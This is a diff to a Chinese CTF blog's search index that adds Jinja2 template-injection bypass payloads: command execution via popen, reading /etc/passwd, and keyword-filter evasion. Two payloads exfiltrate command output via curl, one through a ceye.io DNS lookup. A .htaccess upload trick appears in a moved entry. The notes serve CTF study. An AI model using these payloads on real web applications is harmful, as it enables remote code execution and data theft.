@@ -1892,9 +1892,16 @@ __init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span
 
 <p><strong>总结一下，就是先找到一个合适的攻城锤(内含os的类或可命令执行的函数)和一把趁手的宝剑(可以使用的方法)</strong></p>
 <h4 id="jinja2的过滤"><a href="#jinja2的过滤" class="headerlink" title="jinja2的过滤"></a>jinja2的过滤</h4><p><strong>过滤[</strong></p>
-<pre><code class="highlight plaintext">#getitem、pop
-&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()
-&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read()</code></pre>
+<pre><code class="highlight python"><span class="comment">#getitem、pop</span>
+<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()
+<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()
+<span class="comment">#也可以用__getattribute__绕过</span>
+&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;
+<span class="comment">#或者配合request</span>
+&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami
+
+<span class="comment">#或者用print标记</span>
+&#123;%<span class="built_in">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)%&#125;</code></pre>
 
 <p><strong>过滤引号</strong></p>
 <pre><code class="highlight plaintext">#chr函数
@@ -1921,8 +1928,9 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 //request.args.xx就能直接查询对应的参数值，把原参数换成[request.args.xx]即可</code></pre>
 
 <p><strong>过滤花括号</strong></p>
-<pre><code class="highlight plaintext">#用&#123;%%&#125;标记
-&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</code></pre>
+<pre><code class="highlight plaintext">#用&#123;%%&#125;标记，同时外带
+&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;
+&#123;% if ().__class__.__base__.__subclasses__()[433].__init__.__globals__[&#x27;popen&#x27;](&quot;curl `whoami`.k1o75b.ceye.io&quot;).read()==&#x27;kawhi&#x27; %&#125;1&#123;% endif %&#125;</code></pre>
 
 <p><strong>过滤关键字</strong></p>
 <ul>
@@ -1951,7 +1959,9 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 <li>join拼接</li>
 </ul>
 <p>利用join（）函数绕过关键字过滤</p>
-<pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;</code></pre>
+<pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;
+&#123;&#123;()|attr([&quot;_&quot;*2,&quot;cla&quot;,&quot;ss&quot;,&quot;_&quot;*2]|join)&#125;&#125;
+&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</code></pre>
 
 <ul>
 <li>利用引号绕过</li>
@@ -1987,7 +1997,8 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 <p>对于python2，可利用base64进行绕过，对于python3没有decode方法，不能使用该方法进行绕过。</p>
 </li>
 </ul>
-<pre><code class="highlight plaintext">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>
+<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;
+//__class__</code></pre>
 
 <p>例子：</p>
 <pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;  
@@ -2018,6 +2029,21 @@ post:arg1=open&amp;arg2=/etc/passwd</code></pre>
 <pre><code class="highlight plaintext">&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>
 
 <pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>
+
+<ul>
+<li>绕过config</li>
+</ul>
+<pre><code class="highlight plaintext">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;
+&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</code></pre>
+
+<ul>
+<li>过滤args和.和_</li>
+</ul>
+<pre><code class="highlight plaintext">&#123;&#123;()|attr(request[&#x27;values&#x27;][&#x27;x1&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x2&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x3&#x27;])()|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(40)|attr(request[&#x27;values&#x27;][&#x27;x5&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x6&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x7&#x27;])|attr(request[&#x27;values&#x27;][&#x27;x4&#x27;])(request[&#x27;values&#x27;][&#x27;x8&#x27;])(request[&#x27;values&#x27;][&#x27;x9&#x27;])&#125;&#125;
+
+post:x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;whoami&#x27;).read()</code></pre>
+
+
 
 <h4 id="打马环节-待补完"><a href="#打马环节-待补完" class="headerlink" title="打马环节(待补完)"></a>打马环节(待补完)</h4><h2 id="PHP模板注入"><a href="#PHP模板注入" class="headerlink" title="PHP模板注入"></a>PHP模板注入</h2><p>php常见的模板：twig，smarty，blade</p>
 <h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHP模板的鼻祖，后来的php模板大多都是基于其发展起来的</p>
@@ -2775,21 +2801,6 @@ setattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>文件上传漏洞</title>
-    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
-<p>弱判断:bp改一下就能过</p>
-<p>增加文件头</p>
-<p>改phtml绕过</p>
-<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
-<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
-<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
-]]></content>
-      <tags>
-        <tag>-CTF -Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>从零开始的SQL注入生活</title>
     <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
     <content><![CDATA[<h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
@@ -3066,6 +3077,21 @@ str:截取的字符串   <span class="keyword">start</span>:起始位置   lengt
 ]]></content>
       <tags>
         <tag>-web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞</title>
+    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
+<p>弱判断:bp改一下就能过</p>
+<p>增加文件头</p>
+<p>改phtml绕过</p>
+<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
+<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
+<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
+]]></content>
+      <tags>
+        <tag>-CTF -Web</tag>
       </tags>
   </entry>
   <entry>
